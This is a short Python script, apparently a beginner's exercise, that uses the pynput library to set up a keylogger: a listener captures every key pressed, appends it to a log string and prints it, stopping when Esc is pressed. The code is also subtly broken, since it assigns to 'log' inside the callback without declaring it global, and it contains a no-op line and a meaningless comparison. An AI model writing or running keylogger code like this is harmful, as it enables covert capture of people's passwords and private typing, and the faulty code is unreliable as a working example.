import pynput.keyboard              
from pynput import keyboard        


log = ""

def callback_function(key): 
    log = log + str(key)          

    if log == "AttributeError":   
        log + " "

    if key == pynput.keyboard.Key.space:        
        log = log + " "
    print(log)                   
      
    if key == pynput.keyboard.Key.esc:   
        return False

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function) 


with keylogger_listener:    
    keylogger_listener.join() 




